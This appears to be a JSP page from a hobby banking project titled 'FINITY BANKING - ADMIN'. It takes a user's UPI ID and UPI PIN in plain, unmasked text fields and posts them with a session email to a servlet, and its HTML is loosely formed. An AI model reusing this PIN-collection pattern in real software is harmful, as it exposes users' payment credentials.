<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css"
      integrity="sha512-xh6O/CkQoPOWDdYTDqeRdPCVd1SpvCA9XXcUnZS2FmJNp1coAFzvtCN9BmamE+4aHK8yyUHUSCcJHgXloTyT2A=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    />
    <!-- <link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico" type="image/x-icon" />
    --> <link rel="stylesheet" href="signup_giftcode.css" />

    <title>FINITY BANKING - ADMIN</title>
 
 
 <style type="text/css">
 
 
 /* Color ------------------------------------------- */

:root {
  --color-invalid: #e50914;
  --color-invalid-hover: #f11722;
  --color-valid: rgb(13, 150, 65);
  --color-forgot: #0071eb;
  --color-line: rgb(247, 247, 247);
  --color-flag: rgb(232, 225, 225);
  --color-footer-bg: #f3f3f3;
}

/* Box Sizing -------------------------------------- */

*,
*::before,
*::after {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

/* Text, Tag Style --------------------------------- */

h1 {
  font-size: 2rem;
  font-weight: 500;
  line-height: 1.3;
}
h2 {
  font-size: 0.84rem;
  font-weight: 300;
  line-height: 1.3;
  text-transform: uppercase;
}
a,
li {
  text-decoration: none;
  list-style: none;
}
p,
span {
  font-weight: 300;
}
body {
  font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
}

/* Text Style -------------------------------------- */

.text-gray {
  color: gray;
}
.text-terms {
  font-size: 0.8rem;
  color: grey;
}
.text-terms-1 {
  cursor: pointer;
  font-size: 0.8rem;
  color: var(--color-forgot);
}
.text-change {
  font-size: 1rem;
  font-weight: 600;
  color: black;
}
.text-change-1 {
  font-size: 1rem;
  font-weight: 300;
  color: grey;
}
.text-change-2 {
  font-size: 1rem;
  font-weight: 600;
  color: var(--color-forgot);
}
.text-change-2:hover {
  text-decoration: underline;
}
.text-error {
  font-size: 0.8rem;
  color: var(--color-invalid);
  display: none;
}
.text-underline {
  cursor: pointer;
}
.text-underline:hover {
  text-decoration: underline;
}

/* Spacing ----------------------------------------- */

.margin-top {
  margin-top: 1rem;
}
.margin-top-1 {
  margin-top: 1.4rem;
}
.margin-bottom {
  margin-bottom: 1rem;
}
.margin-bottom-1 {
  margin-bottom: 1.4rem;
}
.margin-block {
  margin-block: 1rem;
}
.margin-inline {
  margin-inline: auto;
}

/* Button ----------------------------------------- */

button,
.btn {
  display: flex;
  align-items: center;
  justify-content: center;
  text-align: center;
  cursor: pointer;
  font-size: 1.1em;
  font-family: inherit;
  font-weight: inherit;
  padding: 1.1em;
  border: none;
  border-radius: 4px;
  color: white;
  height: 3.2rem;
  max-width: 100%;
}
.btn-wide {
  font-size: 1.5em;
  height: 4rem;
  background: var(--color-invalid);
  width: 100%;
}
.btn-change {
  justify-content: space-between;
  background-color: var(--color-line);
  text-align: start;
  height: 4.6rem;
  width: 100%;
}
.btn-logout {
  font-weight: 600;
  color: black;
}
.btn-wide:hover {
  background-color: var(--color-invalid-hover);
}

/* Logo ------------------------------------------ */

.logo {
  margin-top: 0.4rem;
  width: 8rem;
}

/* Nav ------------------------------------------- */

.nav {
  position: relative;
  display: flex;
  align-items: center;
  width: 100%;
  padding: 1.4rem 3.2rem;
  z-index: 2;
}
.nav-3 {
  justify-content: space-between;
  border-bottom: 1px solid var(--color-flag);
}

/* Container ------------------------------------- */

.main-container {
  display: grid;
  place-content: center;
  min-height: 67vh;
  padding: 2rem;
  max-width: 30rem;
  animation: form ease-in-out 0.6s;
}

/* Input Field & State--------------------------- */

::placeholder {
  color: transparent;
}
::-ms-input-placeholder {
  color: transparent;
}
label {
  color: white;
  transition: top 200ms ease-in, left 200ms ease-in, font-size 200ms ease-in;
}
.input {
  position: relative;
}
.input-field {
  border: 1px solid gray;
  outline: none;
  font-size: 1em;
  border-radius: 4px;
  padding-inline: 1.36em;
  padding-block: 1.8em 1em;
  height: 4rem;
  width: 100%;
}
.input-label {
  display: grid;
  position: absolute;
  top: 1.36rem;
  left: 1.36rem;
  color: gray;
  transition: top 200ms ease-in, left 200ms ease-in, font-size 200ms ease-in;
}
.input-field:focus {
  border: 1px solid var(--color-forgot);
}
.input-field:focus ~ .label-size,
.input-field:not(:placeholder-shown) ~ .label-size {
  top: 0.6rem;
  left: 1.36rem;
  font-size: 0.9em;
}
.input-field:valid {
  border: 1px solid var(--color-valid);
}
.input-field:not(:placeholder-shown):invalid {
  border: 1px solid var(--color-invalid);
}
.input-field:not(:placeholder-shown):invalid ~ .text-error {
  display: block;
}

/* Footer ----------------------------------------- */

.footer {
  padding: 3rem;
}
.footer-container {
  display: grid;
  max-width: 50rem;
  gap: 1.6rem;
  color: gray;
}
.footer-gray {
  background-color: var(--color-footer-bg);
  border-top: 1px solid var(--color-flag);
}
.links {
  display: flex;
  line-height: 1.7;
  justify-content: space-between;
  gap: 2rem;
}

/* Language Option ------------------------------ */

.language {
  position: relative;
}
.language-select {
  appearance: none;
  cursor: pointer;
  height: 2.4rem;
  max-width: 12rem;
  border-radius: 0.2rem;
  padding-inline: 2.4rem;
  outline: none;
  color: gray;
  background-color: transparent;
}
.language-icon {
  position: absolute;
  height: 100%;
  top: 0;
  font-size: 0.9rem;
  display: flex;
  align-items: center;
}
.globe {
  position: absolute;
  left: 1rem;
}
.chevron {
  position: absolute;
  left: 10rem;
}

/* Animation --------------------------------------- */

@keyframes form {
  from {
    transform: translateX(2rem);
    opacity: 0;
  }
  to {
    transform: translateX(0);
    opacity: 1;
  }
}

/* Media Query ------------------------------------- */

/* Nav Media Query */

@media (320px <= width <= 640px) {
  .nav {
    padding-inline: 2rem;
  }
  .logo {
    width: 6rem;
  }
}

/* Footer Media Query */

@media (320px <= width <= 640px) {
  .footer {
    padding-inline: 2rem;
  }
  .links {
    display: grid;
    grid-template-columns: 1fr 1fr;
  }
}
@media (320px <= width <= 450px) {
  .links {
    display: block;
    line-height: 2;
  }
}

@media (min-width: 2048px) {
  nav, form, footer {
    zoom:2;
  }
}
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 </style>
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
  </head>

  <body>
   
   <%
   
  String f=session.getAttribute("setmail").toString();
   
   
   
   %>
   
   
   
   
   
   
   
   
    <nav class="nav nav-3">
      <a href="">
      <h1 class="logo">Generate</h1>
      </a>
    
    </nav>

    <form action="Upi" method="post" class="main-container margin-inline enter">
      <div class="gift-code">
        
        <h1 class="margin-bottom-1">Enter UPI ID</h1>
      </div>

      <div class="input">
        <input class="input-field" type="text" name="id"  id="input-id" placeholder="password"  autocomplete="off" required />
 <div class="gift-code">
        
        <h1 class="margin-bottom-1">Enter UPI PIN</h1>
      </div>
   <div class="input">
        <input class="input-field" type="text" name="pin"  id="input-id" placeholder="password" autocomplete="off" required />
 
    <!--  <div class="gift-code">
        
        <h1 class="margin-bottom-1">Enter UPI ID</h1>
      </div> -->

      
      
      
      
      
      
      
      <div class="input">
        <input class="input-field" type="hidden" name="emaill" value="<%=f%>" "title="Must be at least 8 character" id="input-id" placeholder="password"  autocomplete="off" required />

     
     
   
     
     
     
     
     
     
     
     
     
     
     
     
     
       
        <button type="submit" class="btn-wide margin-top-1">Submit</button>

       
  </body>
</html>
